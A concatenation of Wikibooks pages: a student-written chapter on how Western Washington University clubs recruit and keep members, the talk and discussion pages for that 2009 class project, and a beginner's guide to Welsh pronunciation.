The sense of community that CCF has didn’t just “happen”, however. Too often a club wants to have community, but doesn’t invest the time or resources to make it happen. In CCF and in other groups that are ‘tight knit’ such as the A Cappella Club, the sense of community is something that active members continually strive for by having regular meetings, small groups (Cores for CCF), and a laid back atmosphere. The leaders of CCF recognize the want and in some ways the need for the members of CCF to be a strong community, and thus sometimes there are special events that occur, for example the Fall and Winter Camps. These events can cost an amount of money that may be difficult for a typical college student to attain. Thus, if someone wants to go to such an event and the only thing stopping them is finances, they need only to talk to a core leader or one of the CCF leaders because of the scholarships that are available, in part made possible by the offering that is sent around every Friday night. The leaders will work with you to see how much you are able to contribute to the cost and will strive to create a reasonable percentage for you to pay based on your circumstances. This furthers the sense of community both through the event itself and through the reciprocation of funds from those who give to those who need.

The current vice president of SRE (Students for Renewable Energy) said that the club has found that focusing on &quot;projects that pertain to each individual’s interest keeps people interested in staying with the club.&quot;  The club divides up their members into several different committees.  SRE has noticed that by doing this, more members took on leadership roles, and thus, more investment in the club.  This system allows people to work on whatever they are most interested in.  Next year's president of the club said, &quot;Being able to have involvement in different projects, members can choose what they are most interested in.&quot;  Similarly, the Photography Club allows their members quite a bit of freedom to work on whatever project they would like.  By taking pictures, people in the club are able to show their personality, interests and emotions and with the variety of projects, the members of SRE also are able to feel a connection and express themselves through their work

After attending various meetings of the Harry Potter club, I went into researching the strong bond the club has between members. The atmosphere in their room wasn’t only like that of a club, but also a family. I believe that this sort of relaxed feeling is a result of great leadership. With the Harry Potter series being finished for about two years, it’s been hard for the club to keep members interested in the idea of Harry Potter. Chris Godwin (future President) told me that keeping members interested in the club was one of their greatest challenges.  However, they have solved their dilemma by talking about theories, future awareness, holding events, parties, theories about the movies and a lot more. After researching other clubs, the SMASH club seemed to be having problems with their leadership. The group is poorly organized and seems as if its being torn into two different clubs, which I believe, is hindering them a lot. The replay value of Smash Bros is a lot higher than rereading a book where the story doesn’t change. Also, the Harry Potter club isn’t split into subcategories like for example the movie and the book but rather integrates it all into two hours of shared devotion. If it weren’t for the time and devotion that the leaders of the Harry Potter club put into it, I don’t feel it would be as successful as it is now.

VOX: Voices for Planned Parenthood provides great incentive to keep members coming to meetings. They provide free pizza for all attendees and give out free condoms at the meetings. VOX also provides a place to socialize with others who have the same interests in social outreach and sexual health. The leader starts each meeting by going around in a circle and asking a funny question. For example, for the meeting I attended the question was: “if you could be named after a state, what state would it be?” This social element is important in lots of clubs. In CCF core groups, meetings start with all members talking about their “pows” and “wows” for the week, which means the good and bad events the members have experienced that week. The American Civil Liberties Union club similarly starts meetings with “balloons” and “baggage.” There are lots of activities at meetings. The Mt. Baker Planned Parenthood branch regularly sends representatives and educators to VOX to talk about sexual health, which keeps the meetings fresh and entertaining.

Because VOX: Voices of Planned Parenthood keeps meetings light and entertaining, members form a strong sense of community and friendship which ensures both high attendance and more effective dialogue.  One member who I interviewed stated that the main reason she regularly attends is because she loved spending time with the other members in such a fun environment.  The organization is very egalitarian; all members contribute as much as they choose during meetings, creating a feeling of ownership of the club's accomplishments, which in turn often results in dedication and higher meeting or event attendance. Members are all highly passionate about sexual and reproductive health, and this common passion further bonds the members together and facilitates their sense of community.  This is very similar to the Ritmo Salsa Dancing club, where members come for their passion for dance, but continue coming for the welcoming, fun environment.

The Filipino American Student Association is one of the many strong diverse clubs of the Ethnic Student Center and much of what they believe in is sharing a part of their culture to others and connecting through what we learn from each other. What FASA aims for is to celebrate an avid interest in the Filipino Culture that attracts people of many ethnicities. At FASA we are able to come as we are ready to learn about a culture they either already know of or wish to know of. How FASA does this is making sure meetings are fun so that everyone participates. Participation is heavily stressed at FASA meetings as it is a way to get to know people. By having ice-breakers people lose their inhibitions in partake in a game. It's very casual and entertaining which ultimately reels people in for what's next in the meeting. As they feel more comfortable around the members in FASA we are able to move into the culture sharing which initiates discussion among members. Regardless of if they are new or not members have been seen to be more active after introductions and the ice-breakers. Hui O' Hawaii has also maintained the same kind of technique by holding meetings almost as &quot;hangouts&quot; while still being able to &quot;balance work and play and enjoy the best of both worlds&quot;. It is casual enough so that novices do not feel intimidated to come to a meeting for the first, and it encourages them to return. Officers also take careful notice of who each person is that attends the meetings. That way they are greeted by name and feel instant belonging.

The A'Capella club needs to find a way to retain members. What tends to happen within the club, is once people graduate from Western, their spots don't get filled and the group gets smaller each year until its just ceases to exist. The group, like the Hui O' Hawaii club, has a strong bond of friendship, but it cant really be applied to keeping the A'Capella club together. The A'Capella Club isn't an actual as club, but more of a group of guys that just really like to sing, and so its hard to keep the group going if the majority of the group has left. If the group became a more &quot;legit&quot; group that was soime how affiliated with the music department or something like that, it might have a better chance of retaining members.

Like previously stated, The A'Capella club has problems invoking motivation into its members. Perhaps this is because of a sense of &quot;illegitimacy,&quot; in terms of foundation in the AS. However, I consider the group as almost too much of a joke and hobby to be considered an actual &quot;club&quot;. And despite what was previously mentioned, the group's bond of friendship--which brings strength to the Hui O' Hawaii club--is possibly more detrimental to the group's health than it is beneficial. From interviewing Doug, I sensed a lack of seriousness. Though the group performs, and some of the members are very into singing on stage, the A'Capella club is more for fun than it is for any other reward. Therefore, motivation dwindles. Without deadlines or obligations as a group, there rises a lack of determination. However, it goes without saying, the group is still enjoyed by its members, for it still provides a good time for all involved. 

Through studying the Salsa club on campus it is apparent that member retention is key to a successful club. The Salsa club prides itself for keeping many members and almost always having new members at their meetings. The club has an effective strategy of keeping all new members at the same level. All beginner classes are the same which makes it possible to repeat them until a new member is satisfied with their performance. This level playing field keeps new members interested and makes them comfortable in their new environment. As members work their way up new dance moves and ideas will be incorporated into the classes always keeping members interested. Comparing this club to many other clubs one can see that comfort is key to retaining members. The salsa club keeps its members comfortable by keeping them on a level playing field.

While some clubs find creative ways to not only recruit new members, but also keep current members in contact with each other, such as the Strongman club -utilizing Facebook- other clubs suffer from lack of members.  

An example of a club suffering from the lack of new members is the Cycling Club and Swing Dance club.  Both clubs have a strong leadership position with people who are willing to put in their time to help members, along with strengthening their communication that kept their groups somewhat organized.  However, a top priority was to acknowledge members who were interested in joining the Cycling and Swing Dance club and to recognize reasons why people were hesitant to join. This way, the Cycling and Swing Dance club can target these areas such as informing students that no experience is needed along with not being afraid to approach the club unknown.  The two clubs could benefit from studying other clubs that have successful recruitment and communication, and brainstorm what they could do to make their clubs more effective.

===Communicating With Members During University Breaks===
Communication is one of the major aspects of keeping a club in sync by making the members feel more apart of a group, which is important in the structure of developing a successful club especially during university breaks. There are many ways to keep in touch with members within a group like organizing a meeting and texting each other through cell phones, but it seems the most efficient is through the internet whether it is through a message board on a club website, or Facebook.
 
The WWU Cycling group has a very young and technologically savvy leadership. On and off the race season they have taken to using the internet and message boards to keep in contact with the all of their active members. Through the message boards (www.wwucycling.com) club members contact one another to arrange logistical solutions such as attaining transportation to and from competitive races (Patrick Maloney 2009). The boards are also used off season to set up fun weekend, or training rides which are open to anyone in the community who wants to attend. The leadership has found that using these message boards and group emails has made getting information out to the members more successful than trying to set up physical meetings because with their large active membership it is virtually impossible to set a time where all can attend. Other groups such as the A’Acapella Club have started to utilize these technologies to garner more membership participation, as well as getting the word out about their clubs (Megan Jones 2009). The expanded use of message boards for membership contacts can only assist the WWU cycling club and other AS clubs with retaining their members and gathering new ones with such more and more demands on the time of their members.

====Maintaining New Member Interest From Spring Quarter Through Fall====
Clubs face challenges when the summer vacation arises.  Many people leave and nothing happens with the club.  It is important for the club leaders to think of ideas to win back their members when the fall quarter starts up and get them excited for the new year to come. Another important factor is to maintain communication. This can often be done through technology like texting or Facebook. This can help the members still feel part of the club and a valuable asset to the organization. Hopefully, good ideas could allow them to have consistent membership throughout the year.

Western Men Against Violence, like previously stated, does not use &quot;in your face&quot; advertising. They strive to create an environment where members want to be there and want to come back. WMAV looks to establish new ideas of masculinity and provide an outlet for men who just need to get things off their chest. The club creates passion in individuals throughout the year and therefore, has no need to win members back. This approach creates a desire to come back to the club in the fall. Summer additional communication may be important, but in a club as intimate as WMAV, many members communicate outside of the club anyway. However, if need be, it is easy to learn the new meeting time (and such) and the event fair.

Other clubs, like The Homeless Outreach Program or the A'capella Group, likely have similar situations. Those are both smaller clubs that provide some kind of fulfilment in the lives of members. That alone is enough for people to go back to clubs during fall quarter. This may be a more impractical expectation for groups with larger membership and groups that provide fun, but not necessarily personal gratification.

===Overcoming Other Retention Challenges===
Through my research of The Dead Parrots Society, the issue of retaining constant members seems to be a slight problem. Art related clubs of this nature tend to have such a relaxed feel about them, that members come and go inconsistently. Their regularly scheduled weekly meetings often have a great turnout. However, it seems that attendees are either new or just &quot;hanging out&quot; attending their club for once. There is a lack of rehearsal attendees that have graduated from the college. The club does not discriminate against attendees not associated with WWU currently. Those members of the Parrots Society have graduated and moved on to other things. Many groups containing adult members have this issue. I would not suggest they change their open organization and membership approach at this time. However, they may succeed in recruiting more graduated players if they showcased a few of them in their shows and/or got a few faculty members involved. Compared to the Scottish Country Dance Club, the Parrots Society is not facilitated by faculty members who teach dance at WWU. That is one less recruitment strategy that could be useful to the Parrots Society. 

In Associated Students Productions, there are a few different leadership/recruitment problems. They have a hard time trying to find people to step up and take charge of certain events and have them stick with it. Most of the events are huge events, so all the Western’s students can have the chance to get involved and go participate in the events. So, this means that the people building and creating this event have to spend hours and hours trying to figure out what most of the study body would want to see at Western or do at Western.  They also want to make sure that the people who are taking the leadership roles do a good job preparing the events and activities so that students are informed and want to go to the events. This is a big deal for Associated Students Productions because they want to reach out to all the students at Western and make them have a great time at college. In the discussion board of 7 World injustice society, in Lesley Gordon post she said that she interviewed Maria Zupan, which she asked about the leadership roles in her club. She asked if she thinks that the role of being a club leader has changed her in any way. And Maria said that she feels like she knows how to put things together and get things going. So this to mean helps me understand that ASP is not the only club out there that is struggling all of the time with trying to get things going and trying to people involved. It seems like this club also struggles with getting people involved and getting recognized around campus. Last there was A'capella club interview done by Reggie Peltier, and he interviewed Douglas Williams. In this interview Douglas mentions that there wasn’t a lot of leadership in with this A'capella group. So this shows that ASP is not like this group what so ever. It seems like ASP is very leadership based and this club is not. But with ASP, they have made many different strategies that help them out with recruitment. Some include work based study, some include just organizing different events in red square that may get more people involved to make them feel like they can get involved. And last, some include salary based work for people who wanted to work for Associated Students Productions.

== Book editor ==
Hi StephenG, regarding your [{{fullurl:GTK%2B_By_Example/Writers|diff=1504780&amp;oldid=1504758}} comment] on [[GTK+ By Example/Writers]] and darklama's [[User talk:Darklama#Claiming the position of editor|user page]]; there is no such title as book editor. Decisions are made by consensus and compromise. Wikibooks is big enough to accomodate [[Wikibooks:Forking policy|different approaches]] and cases of Wikibookians clashing are rare. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 06:14, 22 May 2009 (UTC)
:I was more interested in those labels saying this page has not been reviewed.  I thought someone needed to review them. [[User:StephenG|StephenG]] ([[User talk:StephenG|talk]]) 07:30, 22 May 2009 (UTC)

== Show preview ==
I've noticed you often make a great number of edits that are closely spaced. You might want to consider using the ''[[Help:Show preview|Show preview]]'' button that is located next to the ''Save page'' one. Previewing your contributions helps keep the page history clean and accessible. You don't get as high an edit count, but then again it's not a competition. Happy editing. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 06:14, 22 May 2009 (UTC)
:I did not consider it either way, It was just easier that way.  I will take you advice into account. [[User:StephenG|StephenG]] ([[User talk:StephenG|talk]]) 07:30, 22 May 2009 (UTC)</text>

This book is a new one (As of May 2009). It is initially a course project May- June 2009. This text will be under expansion by students in Anthropology at Western Washington University--[[User:Paul James|Paul James]] ([[User talk:Paul James|talk]]) 10:30, 6 May 2009 (UTC). Following June (or at any time) this text can be expanded to include additional examples of university student organizations. If you are knowledgeable or have experience in the area of operating and managing student organizations please begin adding and revising where you see fit. If you plan to make significant organizational changes (create new topics and headings or collapse/move sections) please begin by adding comments and suggestions on this page.

Before getting started please review the following 

[[Help:Editing]] for details on how to edit and format additions

and [[Wikibooks:Guidelines_for_class_projects]] for basic information about logging in etc.



== Course Project ==
From May through June 2009 students in Anthropology at Western Washington University will be expanding and developing this text. 


== Suggestion ==
I would like to suggest ...
I made my edit to the ASL section because it did not clearly identify that deaf parents see a deaf child different than hearing parents.  People who are deaf are proud to be and want their deaf (and even hearing) child to be fluent in ASL.

Should add reference to this news  re social networking. http://huntnewsnu.com/2011/09/clubs-look-to-social-media-to-engage-students/ --[[User:Paul James|Paul James]] ([[User talk:Paul James|discuss]] • [[Special:Contributions/Paul James|contribs]]) 19:37, 10 October 2011 (UTC)

=    * 1 Recruitment=
I deleted a sentence which made the Dead Parrot Society seem to be a difficult club to get in to and gave the paragraph a intro that best represented the clubs similarities and differences with recruitment.[[User:Dumass|Dumass]] ([[User talk:Dumass|talk]]) 05:49, 5 June 2009 (UTC) 

Note: I deleted a sentence that I felt served no particular purpose to the topic of the paragraph.

I added an introductory summary for the Swing Dance Club paragraph.  Before, it jumped from one club to another, without any sort of flow.  I also edited the paragraph for grammar and wrote a quick transition sentence for the next paragraph- Dead Parrots Society). 

D. I added a conclusion under the general recruitment section because I felt that it had a lot of suggestions, but then just fell off without concluding the idea of recruitment and it's importance. 

Added a small paragraph about students self motivation to seek out groups vs. just active recruitment --[[User:Clevenz|Clevenz]] ([[User talk:Clevenz|talk]]) 06:39, 5 June 2009 (UTC)

==          o 1.1 Invite Based Recruitment==
I added an intro paragraph explaining the benefits of a personal invitation system of recruitment and the positive affect that sort of invitation will have on the new members to the group. [[User:Lordanc|Lordanc]] ([[User talk:Lordanc|talk]])


==          o 1.2 Advertisement==

I added the fact that the Rugby Club recruits all year round. I feel like it really added to describing their effectiveness of hiring and the friendly nature of the club.

I contributed an introductory paragraph about advertisement. I felt it was necessary because in my own research and from reading other student’s work. Advertisement was such a big part of the process of building a strong club or an organization. So, I thought adding that paragraph would give a glimpse to how crucial it is. [[User:Underwk4|Underwk4]] ([[User talk:Underwk4|talk]])

I moved a description of sailing advertisement to the word of mouth page because it was more fitting. I talked more about word of mouth than other form of advertisement.

I added information regarding effective advertisement.

==          o 1.3 Interest==
Note: I added a paragraph here, explaining a good recruiting strategy, but for some reason it is spaced out very wierd into one super long text, even though I wrote it as a paragraph with many lines. Tried to fix but could not.

I added an introduction paragraph. I felt this was necessary to introduce what we were meaning by interest. Before the wikibook just jumped right into examples of interest but now that there is an introduction I feel that it flows a little better. Also, I feel like it makes the examples more meaningful because the reader has a feel of the topic of interest before they read the examples.

I added a paragraph at the end of the sub-heading Word of Mouth to emphasize how easy and effective it is to recruit members by word of mouth in a large university. I added this not necessarily as a recap paragraph, but to show the success that word of mouth accomplishes here at Western and to encourage those thinking about joining a club to do so.

I added a new introduction that introduces how Western's clubs initial interest is gained. I show that with strategies of the following clubs, interest can be kept after this initial interest. I think it is important for those looking into good club organization to realize that the info fair is a great way for people to find out about potential clubs.

==          o 1.4 How to become a member==
                + 1.4.1 Who to contact
                + 1.4.2 First meeting for a new member

Created the section on &quot;Who to contact&quot;, felt very empty down there, and often times new college students are looking for people with similar interests.

Added an introduction to the &quot;First meeting for new members&quot; section because I thought that it would be good to explain how important first impressions are and describe some of what the readers would read in the section.

==          o 1.5 Info fair==
                + 1.5.1 Materials to have at info fair
                + 1.5.2 Registering for Info Fair
I added a new title Event Recruiting, because sometimes club events don't just include members. i was wondering about gloss terms (in this case tabling should it have some sort of definition to it?? it is a type of recruiting strategy) [[User:Dammara|Dammara]] ([[User talk:Dammara|talk]]) 20:29, 31 May 2009 (UTC)

I added a introduction paragraph to the &quot;Event Recruiting&quot; title to clarify the broad definition to the term and to give a starting point for following examples.

I added an introduction paragraph about information fairs. While the intro is specific in talking about WWU's &quot;Red Square Info Fair&quot;, I tried to discuss the purpose and benefit of information fairs in general. I though adding this paragraph would give potential readers a better understanding of what an information fair is and its function before reading about how to take part in one. By applying information taken from the AS Review, this addition may help WWU clubs especially. At the same time, discussing the overall function of information fairs may help readers from any school.[[User:Robert78|Robert78]] ([[User talk:Robert78|talk]])

==          o 1.6 Word of Mouth==

I combined the two paragraphs on LEAD together and changed the opening sentence of the second paragraph to make the section more coherent. I did this because the second paragraph was more of a solution to what was mentioned in the first paragraph but with them separate, the connection wasn't quite clear.

[parsonl4] Added an introduction because the examples need to be introduced as what school they are from and what word of mouth entails and who it effects. Hopefully, will help any future readers understand more clearly word of mouth generally reaches people in social groups that current members exisit in.

I commented on the fact that some clubs will not find word of mouth an effective strategy to use. I think it was necessary to show that, while word of mouth can be a good strategy, it can also be inappropriate (or unreliable) for some clubs.

I added some information about the Dead Parrots and also closed the section with a concluding remark about the use of social networking tools such as facebook that many groups rely on

=    * 2 Barriers to Membership=
I added an introduction paragraph under the title Barriers to Membership, so that the reader would have a preview of what was to follow in the section and also to make the page flow smoothly.

==          o 2.1 Requirements for membership==
I created an intro to this topic to make the section flow more
                + 2.1.1 Identity
                + 2.1.2 Interest
                + 2.1.3 Equipment
                + 2.1.4 Skills
so I thought that whoever wrote the article before did a wonderful job, but even though many clubs do not require any sort of skill, there are definitely some different attitudes that people need to bring to the meetings such as safety, willingness to have fun, and dedication.
I added some information for the cycling club and some of the skills that are required for this club. bertscr(a)
                + 2.1.5 GPA
I added information regarding the RecCenter membership in association with the WWU Bodybuilding Club section. Also I cleared up some odd sounding sentences.

I added a paragraph with another point of view about the importance of GPA.  This is important because many people participate in a club and soon after quit, while the the ones with a high GPA show the dedication to continue. bertscr(c,d)


===2.1.3 Equipment===
I added an introduction to this section because i feel that for many clubs this is a crucial part of their ability to function. I had not at first logged in to make this addition however, so i undid it and reposted it once i was logged in. I do not think that the section necessarily needs a conclusion, however, because it is very short and i think the introduction sums it up fairly well.

===2.1.4 Skills===
I added the fact that skills are obtained in the club through collaboration and being exposed to peers. 

==          o 2.2 Fees for membership==
I added an introductory paragraph explaining why a club may require membership fees. I explained the ways membership fees are paid and what the funds are usually used for. This then transitions into the sub-categories of &quot;Reasonable fees for membership&quot; and &quot;If some can not afford a fee for membership.&quot; [[User:Rosickj|Rosickj]] ([[User talk:Rosickj|talk]]) 02:30, 4 June 2009 (UTC)

                + 2.2.1 Reasonable fees for membership
-Added an intro paragraph here to get the discussion moving.
                + 2.2.2 If some can not afford a fee for membership
No one had written anything about what to do if someone could not afford a membership fee, so I added a few sentences.
                +2.2.3 I added to the intro paragraph to add some ideas of what these membership fees could be used for in order to benefit the club.

=    * 3 Member Retention=
==          o 3.1 Ways to keep members==

I added an introduction to the section, &quot;Ways to keep members.&quot; I felt that club membership is an important topic that needed to be addressed. This section needed to have a quick summary of how and why it is important to keep club members instead of just jumping into examples of how particular clubs do just that. [[User:Spangler5039|Spangler5039]] ([[User talk:Spangler5039|talk]]) 23:03, 4 June 2009 (UTC)

I also added to the introduction paragraph in the &quot;Ways to keep members.&quot; I thought that the introduction paragraph was very important and it was already well written, however I just thought that there could have been a little bit more information added about why keeping members is so important for the clubs.

==          o 3.2 Communicating With Members During University Breaks==
                + 3.2.1 Maintaining New Member Interest From Spring Quarter Through Fall
I added a couple sentences on how to effectively make members feel still part of the club during breaks. By using technology. [[User:Culverd2|Culverd2]] ([[User talk:Culverd2|talk]]) 15:55, 5 June 2009 (UTC)

==          o 3.3 Overcoming Other Retention Challenges==
I added a little to the beginning for an intro to the section. I felt that it just kind of dove into the topic without saying anything about it first.

      <comment>/* Some New Sounds */</comment>
      <text xml:space="preserve">This article is a work in progress but will eventually teach the interested learner how to pronounce almost all Welsh words according to the set of rules. It is particularly useful for travellers to Wales who may not need to speak the language but would love to know how to pronounce the '''place-names'''. It may also be used in conjunction with the other pages in this Wikibook to ensure correct pronunciation of Welsh words. ''Please note that these are only approximate pronunciations, to aid simplicity.''

==Let's Start With What We Already Know ==
These consonants look the same in English and Welsh, and sound the same. 

*b {{IPA|/b/}} Like '''b''' in boy. Welsh example: '''b'''ara ''(bread)''  
*c {{IPA|/k/}} Like '''c''' in cat. Welsh example: '''c'''oron ''(crown)''
*d {{IPA|/d/}} Like '''d''' in dog. Welsh example: '''d'''afad ''(sheep)''
*g {{IPA|/g/}} Like '''g''' in gun. Welsh example: '''g'''law ''(rain)''
*h {{IPA|/h/}} Like '''h''' in happy. Welsh example: '''h'''ebog ''(hawk)''
*l {{IPA|/l/}} Like '''l''' in lake. Welsh example: '''l'''indys ''(caterpillar)''
*m {{IPA|/m/}} Like '''m''' in mad. Welsh example: '''m'''am ''(mother)''
*n {{IPA|/n/}} Like '''n''' in none. Welsh example: '''n'''a ''(no)''
*ng {{IPA|/ŋ/}} Like the end of the English word si'''ng'''. In Welsh, this letter can come at the start of a word. Welsh example: [fy] '''ng'''eni ''([my] birth)''
*p {{IPA|/p/}} Like '''p''' in poker. Welsh example: '''p'''en ''(head)''
*s {{IPA|/s/}} Like '''s''' in sad. Welsh example: '''s'''eren ''(star)''
*t {{IPA|/t/}} Like '''t''' in tar. Welsh example: '''t'''ad ''(father)''
*th {{IPA|/θ/}} Like '''th''' in think (but never as in &quot;them&quot;). Welsh example: [ei] '''th'''ad ''([her] father)''

==Be careful of these...==

These sounds are found in English, but they are represented by different letters in Welsh. Train yourself to read them differently now.

*f {{IPA|/v/}} Like '''v''' in '''violin'''. Welsh example: '''f'''ioled ''(violet)''
*ff {{IPA|/f/}} Like '''f''' in '''friend'''. Welsh example: '''ff'''awd ''(fate)''
*dd {{IPA|/ð/}} Like '''th''' in '''then'''. Welsh example: he'''dd''' ''(peace)''

Further differences between English and Welsh spelling;

* The '''c''' in Welsh only represents a {{IPA|/k/}} sound. It never represents the /s/ sound, as in the English ''city''.
* The '''s''' only represents a {{IPA|/s/}} sound. It never represents the '''z''' sound, as in the word ''laser''.  Indeed, there is no '''z''' sound in Welsh.
* The '''g''' only represents a {{IPA|/g/}} sound. It never represents the sound in English ''gender''.
* The '''th''' in Welsh represents the '''th''' in English ''think''. The '''dd''' represents the other '''th''' in English, like the word '''then'''.

==Some New Sounds ==
These consonant sounds will probably be new to you.

*ch {{IPA|/x/}} Like the Scottish lo'''ch'''. Welsh example: '''ch'''waer ''(sister)''
*ll {{IPA|/ɬ/}} The '''ll''' is a hard Welsh sound to make. It is best described as putting your tongue in the position of '''l''' and then blowing out air gently. Like saying a '''h''' and '''l''' simultaneously, but with more puff. Welsh example: '''ll'''yfr ''(book)''
*r {{IPA|/r/}} The Welsh '''r''' should be trilled and '''always pronounced''' — never drop it, as most British English speakers do in ''barn''. Welsh example: ba'''r'''dd ''(poet)'' 
*rh {{IPA|/r̥/}} The Welsh '''rh''' should be trilled with aspiration. Like saying a '''h''' and '''r''' simultaneously, but with more puff. Welsh example: '''rh'''wd ''(rust)''

==On Sounds==
A short rule this one, but an important one. In Welsh there's no messing around with consonants taking multiple values &amp;mdash; once you have learned what consonant a Welsh letter represents, it will always sound like that, even in unexpected places. 

The same goes for vowels as well, by and large, although certain combinations of vowels have their own sounds (which, likewise, are the same wherever they are encountered.) 

In short, this means that you only have to learn '''one''' rule for each group of symbols. (Naturally, there are exceptions. See Y and W below.)

==Short Vowels==

Now let's start on some vowels. Vowels in Welsh have both a ''long'' and a ''short'' pronunciation. (For information on when a vowel should be long, see 'Long vowels' below.) Short vowels sound like this; 

*a {{IPA|/a/}} Like '''a''' in pat (RP).
*e {{IPA|/ɛ/}} Like '''e''' in pet. 
*i {{IPA|/ɪ/}} Like '''i''' in pit. 
*o {{IPA|/ɔ/}} Like '''o''' in pot (RP). 
*u {{IPA|/ɪ/}} Like '''i''' in pit. 

No, this isn't a typo; the letter '''u''' always sounds the same as the letter '''i''' in Welsh. (Actually, in North Wales '''u''' is pronounced more like {{IPA|/y/}}, like French ''u'' or German ''ü'', but beginner English speakers may find it easier to stick to Southern pronunciation.) Let's carry on. Yes, there are two more!

*w {{IPA|/ʊ/}} As in b'''oo'''k. 
*y {{IPA|/ə/}} Like '''uh''' in '''a'''bove (the &quot;schwa&quot;). Yes, y sounds like ''uh''. (Most of the time!)

==Diphthongs==

When you see two vowels next to each other, the sounds can be simple or complicated. 

*'''ae''', '''ai''' and '''au''' {{IPA|/aɪ/}}- like English sk'''y'''. (Actually, there is an exception for the last one. &quot;au&quot; is the ''plural ending'' for certain words, e.g. ''creigiau''. In these cases, its pronunciation is shortened to a &quot;hanging A&quot; (see below - so the above-mentioned word would be pronounced ''kraig-ya'').
*'''aw''' {{IPA|/aʊ/}} - like English c'''ow'''.
*'''oe''' (and '''oi''' and '''ou''', which are rare) {{IPA|/ɔɪ/}} - like English b'''oy'''.
*'''ei''' and '''eu''' and '''ey''' {{IPA|/əɪ/}} - like nothing in English; try 'uh-ee' and then running the vowels together. If you can't do that, say it like in the English b'''ay'''.

==R==

When you see a vowel followed by an R, or a diphthong followed by an R, both the vowel and the R are pronounced; this differs from many dialects of English. The following sounds are therefore approximate, and you should make sure to pronounce the R.

*'''aer''', '''air''' and '''aur''' - like English f'''ire'''.
*'''awr''' - like English '''hour'''.
*'''er''' - like English b'''are''', but shorter.
*'''ir''' or '''ur''' (or yr in the last syllable of a word; see later) - like English b'''eer'''.
*'''wr''' - like English p'''oor'''.

==Yw, What a Mess==
The rules governing the letter Y are some of the most confusing in Welsh. Normally it's pronounced like the '''u''' in c'''u'''t, but in the '''last syllable''' of a word it represents the sound like the '''i''' in b'''i'''t. '''Note;''' This includes words with only one syllable, such as ''llyn'' (hlin).

Similar rules apply for combinations of y with another letter;
*'''yr''' is (approximately) pronounced like English b'''ur'''n, except in the last syllable of a word, where it is said like in English b'''eer'''. (Both times, the r is audible, not dropped. See the preceding rule.)
*'''yw''' is pronounced like English m'''oa'''n, except in the last syllable of a word, where it is said like the Welsh '''iw''' and '''uw''' (see below).

That just leaves the exceptions. The small words, '''y''', '''yr''' and '''yn''' are pronounced '''uh''', '''urr''' and '''un'''. Just learn them.

==Hanging Vowels==

When a vowel comes at the end of a word of more than one syllable, it is ''still short''. It will seem alien to English speakers to have a short vowel at the end of a word - for an example, try the French ''Ça va?'' which has two hanging 'a's. This applies to all the other vowels as well, so practise hanging '''e''' (as in pet), '''i''' (as in pit), '''o''' (as in pot) and '''w''' (as in book).

==Long Vowels==
Every vowel in Welsh has both a long and a short value. You have already learnt the short values, now here are the long ones:
*a {{IPA|/ɑː/}} Like '''a''' in f'''a'''ther.   
*e {{IPA|/ɛː/}} Like '''ae''' in '''ae'''roplane, but without any trace of an r, or a y sound between the a and the e. 
*i {{IPA|/iː/}} Like '''i''' in mach'''i'''ne. 
*o {{IPA|/ɔː/}} Like '''aw''' in h'''aw'''k. 
*w {{IPA|/uː/}} Like '''oo''' in p'''oo'''l.
*u and y take the same values as i does. Now I know what you're going to say - y only takes the same value as i in the last syllable of a word (if you did say that, well done) - but as we'll see in a minute, vowels are only long in one-syllable words. Right, here we go.

==So when exactly is a vowel long? Wait, forget I asked...==
English beginners may find it easier to stick to the Northern rules for long and short vowels. These are relatively simple;
*A vowel is '''short''' if it comes in a word with more than one syllable.&lt;br&gt; 
So all these rules only come into play when we're talking about '''one-syllable words'''. That narrows the field of play nicely!&lt;br&gt;
*A vowel is '''short''' if it's followed by '''two''' consonants, if the first of the two is '''n''' or '''r'''.
*A vowel is '''short''' if it's in a word of '''one syllable''' and the consonant following it is any of the following; p, t, c, m, ng
*If the vowel is '''a, e, o, w''' or '''y''' and it's ''followed by'' '''l, n''' or '''r''' then it is also short.
*This leaves the following options for when the vowel is long; in a word of one syllable; followed by two consonants the first of which is '''ll''' or '''s'''; either followed by no consonants, or followed by b, ch, d, dd, f, ff, g, s or th, or (if it happens to be '''i''' or '''u''') followed by l, n or r. Crystal clear!

One more point; a circumflex accent (the hat sign) is placed over a vowel to indicate that it's long when you might otherwise think it was short.

==Don't get Stressed==
(This isn't really about pronunciation so much, but it seems appropriate to put it here.)

Stress in Welsh words is very simple; just stress the '''second-to-last syllable'''. This rule is preserved even in the anglicised versions of many Welsh names, such as Car'''MAR'''then, and in personal names such as Rhi'''ANN'''on.  Note that the Welsh pronunciation of the (originally Welsh) name &quot;Meredith&quot; is always Mer'''ED'''ith, and never '''MERR'''edith. 

The only caution with this is, that applies in compound words as well. E.g. if a word is made up of two parts, each of which is a separate word, then each part would be stressed according to the above rule. Example: '''AB'''er'''TAW'''e (Welsh for &quot;Swansea&quot; - literally, &quot;Estuary of the River Tawe&quot;), '''BEN'''di'''GEIT'''vran (&quot;Bran the Blessed&quot;, a figure from Celtic mythology), and '''I'''gam'''O'''gam (Welsh for &quot;zigzag&quot; - literally, &quot;to step from step&quot;).

==Some More Situations==
*'''si''' is pronounced as in English '''sh'''eep, ''when it comes before a vowel.''
*'''I''' is pronounced like in English '''y'''ou, ''whenever it comes before a vowel'' - and this includes in the middle of words, so keep your wits about you!

==W; A Tewwible Letter==
W is another one of those tricky letters. Here are three more rules to learn, each of them requiring careful perusal;
*Occasionally W represents a consonant. Some examples of this are when it comes between a consonant and the letter y, as in ''gwynt'' (gwint), or in the syllable ''wyn'' (winn). When it does represent a consonant, the sound is like the '''w''' sound of English '''w'''et.
*'''ew''' and '''iw''' are further examples of W representing a consonant. This is fine when there is a vowel after the W, so for instance, to say the Welsh name ''Dewi'', say 'Derry', then change the R to a W, as a little kid might. It's slightly harder when the combination is found at the end of a word; for '''ew''', try saying 'terrible', then 'tewwible', then 'teww' dropping the last part of the word. Then try again with 'iwwitating' for '''iw''' (and '''uw''' is pronounced exactly the same way.)
*'''wy''' is pronounced much as in English g'''ooey''', except when the W represents a consonant, as in the first point above. Or when another vowel precedes the W, as in ''Tywyn'' (pronounced ''tuh-win'').

==Other combinations of vowels==
So far we have met many combinations of two vowels which make a different sound together. This is just to note that if you see any ''other'' examples of two vowels together, '''both''' should be pronounced - this is not a diphthong.

==As if we didn't have enough vowels, now there are some missing!==
Sometimes at the end of words you will find two consonants together. If the first of these is a ll, l, r, s or n, just say both consonants. 
